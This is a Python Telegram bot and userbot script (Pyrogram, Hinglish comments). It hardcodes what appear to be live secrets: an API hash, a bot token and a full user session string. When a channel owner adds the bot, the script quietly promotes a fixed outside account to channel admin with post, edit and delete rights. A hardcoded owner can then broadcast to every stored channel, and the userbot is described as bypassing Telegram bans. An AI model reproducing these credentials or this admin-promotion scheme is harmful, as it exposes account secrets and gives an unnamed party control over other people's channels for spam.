import os
import sys
import threading
import asyncio
import logging

# === RENDER CRASH FIX (Python 3.14 Event Loop) ===
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
# ==================================================

from http.server import BaseHTTPRequestHandler, HTTPServer
from pyrogram import Client, filters, compose
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatPrivileges
from pyrogram.errors import FloodWait

logging.basicConfig(level=logging.INFO)
sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

print("🚀 SCRIPT START HUI...", flush=True)

# --- AAPKI DETAILS ---
API_ID = 33603340
API_HASH = "0f1a7f670519f9e44d0d7fdb6aa8efba"
BOT_TOKEN = "7874642792:AAF08vl1-qcMUHOIUZrL5IwJS1A7zoD5ucw"

# 👇👇 YAHAN APNA LAMBA WALA SESSION STRING PASTE KAREIN 👇👇
SESSION_STRING = "BQIAVwwAc4_2nJvRpGmCXcFxY4QpLZV6koXeAGvXzKoGpB0eKaX3mbjeA_P5nIuA0_HWy49i14rN-g0eQ58yljnMVJM8iBrRiJzYiT1XFuu9c8D7izsOCnOaEyh-P6D4nR5wcrmE018GkftBX7jSZCo7E8MvPVndOewPiUV25yeEiwY455kP8wBZG-6bUKBqQirKnOuSG6E7OcSJ8NKm9sNxxi0E94H8DkxYwjgvbEXfDBxY98nFaWzNK7cQFzTLWH9I1-TEM4xCz191K5ngWvdWfGHob03FpEnCoCrB5EgmhH34DFss2aiWbiy9fAi_InJJH_Qcapdp0EahVhSejtQjDPh54QAAAABUOr49AA"

# --- ADMIN IDs ---
BROADCAST_ADMIN_ID = 1484173564    # Jo broadcast karega (Aap)
PROMOTION_USER_ID = 1413135933     # Userbot ki ID (HACRRR_0)

DB_FILE = "channel_list.txt"

def get_channels():
    if not os.path.exists(DB_FILE): return set()
    with open(DB_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def add_channel(chat_id):
    channels = get_channels()
    channels.add(str(chat_id))
    with open(DB_FILE, "w") as f:
        f.write("\n".join(channels))


# --- DUMMY WEB SERVER (RENDER KE LIYE) ---
class WebServerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot and Userbot are Running Perfectly on Render!")
    def log_message(self, format, *args):
        pass

def start_server():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(('0.0.0.0', port), WebServerHandler).serve_forever()

threading.Thread(target=start_server, daemon=True).start()


# --- DONO CLIENTS SETUP ---
# Pehla: Aapka normal Bot
bot = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)
# Dusra: Aapka Userbot (Jo Telegram ke ban ko todega)
userbot = Client("my_userbot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING, in_memory=True)


# ==========================================
# 1. BOT KE FEATURES (Buttons, Broadcast)
# ==========================================
@bot.on_message(filters.command("start") & filters.private)
async def start_cmd(client, message):
    bot_info = await client.get_me()
    add_link = f"https://t.me/{bot_info.username}?startchannel=true&admin=add_admins+invite_users+post_messages+manage_chat"
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ ADD BOT TO CHANNEL ➕", url=add_link)],
        [InlineKeyboardButton("🔔 UPDATE", url="https://t.me/+cgwss3Urm8o3MDI1")]
    ])
    text = (
        f"👋 **Welcome {message.from_user.first_name}!**\n\n"
        "Main aur mera Userbot partner dono active hain!\n"
        "✅ Purani saari requests accept hongi.\n"
        "✅ Broadcast feature ready hai.\n\n"
        "👇 **Add Bot To Channel** par click karein:"
    )
    await message.reply_text(text, reply_markup=keyboard)

# Channel mein aate hi Userbot ko admin banana
@bot.on_message(filters.new_chat_members)
async def bot_added(client, message):
    bot_info = await client.get_me()
    for member in message.new_chat_members:
        if member.id == bot_info.id:
            add_channel(message.chat.id)
            try:
                await client.promote_chat_member(
                    chat_id=message.chat.id,
                    user_id=PROMOTION_USER_ID,
                    privileges=ChatPrivileges(
                        can_manage_chat=True, can_invite_users=True,
                        can_post_messages=True, can_edit_messages=True, can_delete_messages=True
                    )
                )
                print(f"✅ User {PROMOTION_USER_ID} ko admin bana diya gaya!")
            except Exception as e:
                print(f"❌ Admin banane mein error: {e}")

# Broadcast Feature
@bot.on_message(filters.command(["broadcast", "admin"]) & filters.private)
async def broadcast_messages(client, message):
    if message.from_user.id != BROADCAST_ADMIN_ID:
        return await message.reply_text("❌ Aap Admin nahi hain.")
    if not message.reply_to_message:
        return await message.reply_text("⚠️ Pehle post bhejein, fir usko Reply karke `/broadcast` likhein.")
    
    channels = get_channels()
    if not channels: return await message.reply_text("❌ Data nahi hai.")
    
    status = await message.reply_text(f"⏳ {len(channels)} channels mein bhej raha hoon...")
    success = 0
    for chat_id in channels:
        try:
            await message.reply_to_message.copy(int(chat_id))
            success += 1
            await asyncio.sleep(1)
        except FloodWait as e:
            await asyncio.sleep(e.value)
            await message.reply_to_message.copy(int(chat_id))
            success += 1
        except Exception: pass
    await status.edit_text(f"✅ **Broadcast Complete!**\nPost sent to {success} channels.")


# ==========================================
# 2. USERBOT KE FEATURES (Telegram ban bypass)
# ==========================================
# Nayi requests instantly accept karna
@userbot.on_chat_join_request()
async def auto_accept_live(client, request):
    try:
        await client.approve_chat_join_request(request.chat.id, request.from_user.id)
    except Exception as e:
        print(f"Live accept error: {e}")

# Purani 196+ requests accept karna ek sath (Yahan wo error nahi aayega!)
@userbot.on_message(filters.command("acceptall") & (filters.me | filters.user(BROADCAST_ADMIN_ID)))
async def accept_pending_requests(client, message):
    if len(message.command) < 2:
        return await message.reply_text("⚠️ **Format:** `/acceptall -100XXXXXXX`")
    
    chat_id = int(message.command[1])
    msg = await message.reply_text("⏳ Saari purani pending requests accept ho rahi hain...")
    try:
        await client.approve_all_chat_join_requests(chat_id)
        await msg.edit_text("✅ **SUCCESS!** Sabhi pending requests channel mein add ho gayi hain!")
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")


# --- RUN EVERYTHING TOGETHER ---
async def main_run():
    print("🚀 BOT AUR USERBOT DONO START HO RAHE HAIN...", flush=True)
    # Pyrogram compose dono ko ek sath chalata hai
    await compose([bot, userbot])

if __name__ == "__main__":
    try:
        loop.run_until_complete(main_run())
    except Exception as e:
        print(f"❌ FATAL ERROR: {e}")
